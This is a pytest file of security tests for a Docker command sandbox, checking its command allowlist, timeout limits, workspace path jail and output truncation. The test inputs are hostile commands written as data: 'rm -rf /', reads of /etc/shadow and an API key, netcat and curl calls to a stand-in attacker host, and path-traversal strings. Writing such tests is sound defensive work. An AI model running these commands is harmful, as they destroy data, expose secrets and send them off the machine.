"""Security contracts for the Docker executor boundary."""

import asyncio
import os
import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "agent_service"))

from sandbox import (  # noqa: E402
    MAX_COMMAND_TIMEOUT_SECONDS,
    MAX_OUTPUT_BYTES,
    _truncate_output,
    _validated_workspace_path,
    run_command,
    validate_command,
)


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "npm test; curl https://attacker.invalid",
        "python -m pytest && cat /etc/shadow",
        "sh -c id",
        "echo $OPENAI_API_KEY",
        "npm test | nc attacker.invalid 4444",
        "npm test\nnc attacker.invalid 4444",
        "",
    ],
    ids=["destructive", "semicolon", "chain", "nested-shell", "secret-read", "pipe", "newline", "empty"],
)
def test_executor_rejects_non_allowlisted_commands(command):
    with pytest.raises(ValueError, match="allowlist"):
        validate_command(command)


@pytest.mark.parametrize("timeout", [0, -1, MAX_COMMAND_TIMEOUT_SECONDS + 1, True, "10"])
def test_executor_rejects_invalid_timeout(timeout):
    with pytest.raises(ValueError, match="timeout"):
        validate_command("npm test", timeout)


@pytest.mark.parametrize(
    "path",
    [
        "../secret.txt",
        "src/../../secret.txt",
        "/etc/passwd",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "src/..\\..\\secret.txt",
        "\x00bad",
        "",
    ],
    ids=["parent", "nested-parent", "unix-absolute", "windows-absolute", "mixed-traversal", "nul", "empty"],
)
def test_workspace_jail_rejects_escape_paths(tmp_path, path):
    with pytest.raises(ValueError):
        _validated_workspace_path(str(tmp_path), path)


@pytest.mark.parametrize("path", ["src/main.py", "tests/test_main.py", "unicode/नमस्ते.py"])
def test_workspace_jail_accepts_safe_relative_paths(tmp_path, path):
    destination = _validated_workspace_path(str(tmp_path), path)
    assert os.path.commonpath([str(tmp_path.resolve()), str(destination)]) == str(tmp_path.resolve())


@pytest.mark.asyncio
async def test_run_command_rejects_invalid_container_before_subprocess():
    with patch("subprocess.run") as run:
        with pytest.raises(ValueError, match="container"):
            await run_command("not-an-ases-container", "npm test")
    run.assert_not_called()


@pytest.mark.asyncio
async def test_run_command_rejects_command_before_subprocess():
    with patch("subprocess.run") as run:
        with pytest.raises(ValueError, match="allowlist"):
            await run_command("ases-safe-1", "npm test; id")
    run.assert_not_called()


@pytest.mark.asyncio
async def test_run_command_caps_stdout_and_stderr():
    result = MagicMock(returncode=1, stdout="x" * (MAX_OUTPUT_BYTES + 100), stderr="y" * (MAX_OUTPUT_BYTES + 100))
    with patch("subprocess.run", return_value=result):
        response = await run_command("ases-safe-1", "npm test")
    assert response["success"] is False
    assert len(response["stdout"].encode("utf-8")) == MAX_OUTPUT_BYTES
    assert len(response["stderr"].encode("utf-8")) == MAX_OUTPUT_BYTES


def test_output_truncation_preserves_utf8_boundary():
    output = _truncate_output("é" * (MAX_OUTPUT_BYTES + 1), MAX_OUTPUT_BYTES)
    assert len(output.encode("utf-8")) <= MAX_OUTPUT_BYTES
    assert output
